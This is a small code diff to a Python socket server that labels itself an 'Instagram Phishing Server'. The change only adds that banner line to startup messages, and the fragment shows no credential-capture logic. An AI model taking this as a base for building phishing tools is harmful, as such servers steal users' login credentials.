@@ -3,6 +3,7 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ip = socket.gethostbyname(socket.gethostname())
 port = 80
 s.bind((ip, port))
+print("[+] Instagram Phishing Server By DrSquid\n")
 print(f'[+] Hostname: {socket.gethostname()}')
 print(f"[+] Server hosted on {ip}:{port}")
 print("[+] Small Phishing Server is Up.....")
